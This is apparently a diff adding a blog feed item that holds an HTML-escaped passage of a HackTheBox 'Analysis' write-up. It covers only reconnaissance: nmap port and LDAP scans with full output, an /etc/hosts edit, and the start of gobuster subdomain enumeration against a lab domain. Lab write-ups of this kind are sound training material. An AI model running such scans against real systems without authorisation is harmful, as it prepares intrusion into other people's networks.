@@ -12,6 +12,652 @@
     </author>
     
       <item>
+        <title>Analysis - HackTheBox</title>
+        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;Let’s solve another machine from HackTheBox season 4: Analysis. This box is classified as Hard, so buckle up and prepare for battle!&lt;/p&gt;
+
+&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;
+
+&lt;p&gt;For our approach mindset, we shall separate it as the following steps:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Reconnaissance&lt;/li&gt;
+  &lt;li&gt;Getting foothold&lt;/li&gt;
+  &lt;li&gt;System enumeration&lt;/li&gt;
+  &lt;li&gt;Privilege escalation&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;step-1---reconnaissance&quot;&gt;&lt;a href=&quot;#step1-recon&quot;&gt;&lt;/a&gt;Step 1 - Reconnaissance&lt;/h2&gt;
+
+&lt;p&gt;Let’s start by enumerting the machine’s TCP open ports with Nmap:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; ports.nmap &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 1000 &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; 10.129.33.58
+&lt;span class=&quot;c&quot;&gt;# Nmap 7.94 scan initiated Sun Jan 21 20:09:39 2024 as: nmap -p- -A -oN ports.nmap --min-rate 1000 -T4 10.129.33.58&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.129.33.58
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.13s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65507 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;server &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2024-01-21 23:13:31Z&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: analysis.htb0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: analysis.htb0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+3269/tcp  open  tcpwrapped
+3306/tcp  open  mysql         MySQL &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unauthorized&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+33060/tcp open  mysqlx?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+|     Invalid message&lt;span class=&quot;s2&quot;&gt;&quot;
+|     HY000
+|   LDAPBindReq: 
+|     *Parse error unserializing protobuf message&quot;&lt;/span&gt;
+|     HY000
+|   oracle-tns: 
+|     Invalid message-frame.&lt;span class=&quot;s2&quot;&gt;&quot;
+|_    HY000
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49671/tcp open  msrpc         Microsoft Windows RPC
+49672/tcp open  msrpc         Microsoft Windows RPC
+49683/tcp open  msrpc         Microsoft Windows RPC
+49699/tcp open  msrpc         Microsoft Windows RPC
+49709/tcp open  msrpc         Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port33060-TCP:V=7.94%I=7%D=1/21%Time=65AD7A58%P=x86_64-pc-linux-gnu%r(G
+SF:enericLines,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(GetRequest,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\&lt;/span&gt;
+SF:0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(HTTPOptions,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r
+SF:(RTSPRequest,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(RPCCheck,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0&lt;/span&gt;
+SF:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(DNSStatusRequestTCP,2B,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;
+SF:1a&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;1e&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;10&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;88&lt;span class=&quot;s1&quot;&gt;&apos;\x1a\x0fInvalid\x20message\&quot;\x05HY00
+SF:0&quot;)%r(Help,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SSLSessionReq,2B,&quot;\x05\0
+SF:\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0fInvalid&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2
+SF:0message&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;05HY000&lt;span class=&quot;s2&quot;&gt;&quot;)%r(TerminalServerCookie,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+SF:x1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(TLSSessionReq,2B,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;1e&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+SF:x08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;10&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;88&lt;span class=&quot;s1&quot;&gt;&apos;\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(Kerberos,9,&quot;\
+SF:x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SMBProgNeg,9,&quot;\x05\0\0\0\x0b\x08\x05\x1
+SF:a\0&quot;)%r(X11Probe,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
+SF:\x10\x88&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0fInvalid&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20message&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;05HY000&lt;span class=&quot;s2&quot;&gt;&quot;)%r(FourOhFourRequest,9,
+SF:&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(LPDString,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;
+SF:1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(LDAPSearchReq,2B,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;1e&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;
+SF:08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;10&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;88&lt;span class=&quot;s1&quot;&gt;&apos;\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(LDAPBindReq,46
+SF:,&quot;\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\x08\x01\x10\x88&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;Parse
+SF:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20error&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20unserializing&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20protobuf&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20message&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;05HY000&lt;span class=&quot;s2&quot;&gt;&quot;)%r(SIPOpt
+SF:ions,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(LANDesk-RC,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;
+SF:08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(TerminalServer,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(Not
+SF:esRPC,2B,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;1e&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;10&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;88&lt;span class=&quot;s1&quot;&gt;&apos;\x
+SF:1a\x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(JavaRMI,9,&quot;\x05\0\0\0\x0b\x08\x
+SF:05\x1a\0&quot;)%r(WMSRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(oracle-tns,
+SF:32,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;16Inv
+SF:alid&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20message-frame&lt;span class=&quot;se&quot;&gt;\.\&quot;\x&lt;/span&gt;05HY000&lt;span class=&quot;s2&quot;&gt;&quot;)%r(ms-sql-s,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;
+SF:05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(afp,2B,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;1e&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;01
+SF:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;10&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;88&lt;span class=&quot;s1&quot;&gt;&apos;\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(giop,9,&quot;\x05\0\0\0\x
+SF:0b\x08\x05\x1a\0&quot;);
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94%E=4%D=1/21%OT=53%CT=1%CU=38916%PV=Y%DS=2%DC=T%G=Y%TM=65AD7AA
+OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=107%TI=I%CI=I%II=I%SS=S%TS=
+OS:U)SEQ(SP=103%GCD=2%ISR=107%TI=I%CI=RD%II=I%SS=S%TS=U)OPS(O1=M53CNW8NNS%O
+OS:2=M53CNW8NNS%O3=M53CNW8%O4=M53CNW8NNS%O5=M53CNW8NNS%O6=M53CNNS)WIN(W1=FF
+OS:FF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M5
+OS:3CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80
+OS:%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q
+OS:=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A
+OS:=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%D
+OS:F=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%
+OS:O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD
+OS:=G)IE(R=Y%DFI=N%T=80%CD=Z)
+
+Network Distance: 2 hops
+Service Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 3h02m30s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2024-01-21T23:14:40
+|_  start_date: N/A
+
+TRACEROUTE (using port 993/tcp)
+HOP RTT       ADDRESS
+1   129.49 ms 10.10.14.1
+2   129.54 ms 10.129.33.58
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Jan 21 20:12:21 2024 -- 1 IP address (1 host up) scanned in 162.35 seconds
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can see a bunch of services, but the ones that are interesting to me at a first glance are ports 53, 80, 88 and 389. If we attempt to access the website, we get a 404.&lt;/p&gt;
+
+&lt;p&gt;Let’s shift our attention to other services for now. I’ve decided to run Nmap again the script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldap* and not brute&lt;/code&gt; to see if we can find the domain name and other useful information.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ldap* and not brute&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; ldap-enum.txt 10.129.33.58
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
+,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;analysis,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
+|       schemaNamingContext: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Schema,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;analysis,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
+|       namingContexts: &lt;span class=&quot;nv&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;analysis,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
+|       namingContexts: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;analysis,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
+|       namingContexts: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Schema,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;analysis,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
+|       namingContexts: &lt;span class=&quot;nv&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;DomainDnsZones,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;analysis,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
+|       namingContexts: &lt;span class=&quot;nv&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ForestDnsZones,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;analysis,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
+|       isSynchronized: TRUE
+|       highestCommittedUSN: 377005
+|       dsServiceName: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;NTDS Settings,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;DC-ANALYSIS,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Servers,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Default-First-Site-Name,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Sites,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;analysis,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
+|       dnsHostName: DC-ANALYSIS.analysis.htb
+|       defaultNamingContext: &lt;span class=&quot;nv&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;analysis,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
+|       currentTime: 20240122225140.0Z
+|_      configurationNamingContext: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;analysis,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As we can see, the DC for this is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;analysis.htb&lt;/code&gt;. Maybe the reason why the browser was not able to fetch the website through the IP address is because this domain name must be added to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;. Let’s add it to the with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo vim /etc/hosts&lt;/code&gt; and add &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;machine-ip&amp;gt; analysis.htb&lt;/code&gt; at the end of the file. After that, let’s try to access the webpage again:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/analysis01.png&quot; alt=&quot;analysis homepage&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Alright! This seems like a nice website. However, I have not found anything useful within the page or DOM, so I decided to enumerate it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt;. Without any success, I tried to move on to another enumeration method. Since port 53 is open, we might be able to find subdomains associated with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;analysis.htb&lt;/code&gt; name service. For that, I’ve ran &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; with the DNS flag:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster dns &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; analysis.htb &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; analysis.htb:53
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+Gobuster v3.6
+by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@firefart&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Domain:     analysis.htb
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:    10
